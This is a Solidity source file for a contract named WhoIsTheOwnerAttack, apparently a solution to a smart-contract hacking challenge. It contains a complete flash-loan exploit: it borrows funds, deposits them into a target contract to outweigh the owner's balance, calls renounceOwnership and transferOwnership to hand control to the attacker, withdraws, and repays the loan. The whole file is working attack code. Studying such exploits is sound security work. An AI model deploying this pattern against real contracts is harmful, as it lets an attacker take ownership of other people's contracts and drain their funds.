// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


interface whoIsTheOwner {
    function deposit() external payable;
    function withdraw() external;
    function renounceOwnership() external;
    function transferOwnership(address newOwner) external;
}

interface FlashLoan {
    function flashLoan(uint256 borrowAmount) external;
}

contract WhoIsTheOwnerAttack {
    address whoIsTheOwnerAddress;
    address owner;

    constructor(address _whoIsTheOwnerAddress) payable{
        whoIsTheOwnerAddress = _whoIsTheOwnerAddress;
        owner = msg.sender;
    }

    receive() external payable {}

    function takeLoan(address flashLoanAddress, uint256 amount) external {
        FlashLoan(flashLoanAddress).flashLoan(amount);
    }

    function receiveTokens(uint256 amount) external {
        // deposit the balance to get more than the owner
        whoIsTheOwner(whoIsTheOwnerAddress).deposit{value: amount}();

        // receive the owner
        whoIsTheOwner(whoIsTheOwnerAddress).renounceOwnership();

        // transfer the owner to the attacker
        whoIsTheOwner(whoIsTheOwnerAddress).transferOwnership(owner);

        // take the money back
        whoIsTheOwner(whoIsTheOwnerAddress).withdraw();

        // return the money to the DeFi contract
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}